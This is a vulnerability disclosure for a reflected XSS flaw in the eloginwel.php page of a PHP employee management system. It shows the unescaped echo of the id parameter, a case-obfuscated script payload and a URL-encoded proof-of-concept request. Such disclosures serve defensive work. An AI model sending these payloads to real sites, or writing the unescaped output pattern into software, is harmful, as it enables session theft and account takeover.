## EMPLOYEE_MANAGEMENT_SYSTEM file `370project/eloginwel.php` contains a Reflected XSS vulnerability

Impact of the vulnerability
An attacker can craft a malicious URL that injects HTML/JavaScript into the employee portal navigation links. If a victim (e.g., an employee/admin) opens the link, the injected script may execute in the victim’s browser, potentially leading to:

- Session hijacking (stealing cookies/tokens)
- Account takeover (performing actions with the victim’s privileges)
- Phishing/UI manipulation (modifying page content to trick users)

### Payload:

"><ScRiPt>alert(555)</sCrIpT>

```
"><ScRiPt>alert(555)</sCrIpT>
```

### POC:

The vulnerable endpoint is `GET /eloginwel.php?id=...`. The `id` query parameter is inserted into HTML attributes without HTML escaping, e.g.:

<ul id="navli">

​				<li><a class="homered" href="eloginwel.php?id=<?php echo $id?>"">HOME</a></li>

​				<li><a class="homeblack" href="myprofile.php?id=<?php echo $id?>"">My Profile</a></li>

​				<li><a class="homeblack" href="empproject.php?id=<?php echo $id?>"">My Projects</a></li>

​				<li><a class="homeblack" href="applyleave.php?id=<?php echo $id?>"">Apply Leave</a></li>

Send the following request (URL-encoded payload):

GET /eloginwel.php?id=101%22%3E%3CScRiPt%3Ealert%28555%29%3C%2FsCrIpT%3E HTTP/1.1

Host: 370project:82

Accept: text/html

Connection: close

Expected result:
The response HTML contains the injected string inside the navigation link `href` attribute, and when rendered in a browser it executes JavaScript (e.g., a popup `alert(555)`), confirming reflected XSS.

### Sources download:

https://code-projects.org/employee-management-system-in-php-with-source-code/

```
https://code-projects.org/employee-management-system-in-php-with-source-code/
```



![image-20260409151807703](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260409151807703.png)